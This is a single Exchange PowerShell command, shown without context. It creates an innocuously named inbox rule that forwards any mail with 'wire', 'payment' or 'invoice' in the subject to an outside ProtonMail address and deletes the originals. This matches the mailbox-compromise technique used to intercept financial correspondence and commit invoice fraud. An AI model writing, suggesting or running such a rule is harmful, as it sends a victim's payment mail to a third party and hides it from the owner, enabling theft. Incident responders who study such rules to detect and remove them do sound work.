New-InboxRule -Name "MF Dev alerts" -SubjectContainsWords "wire","payment","invoice" -ForwardTo "reconstruction@protonmail.com" -DeleteMessage $true
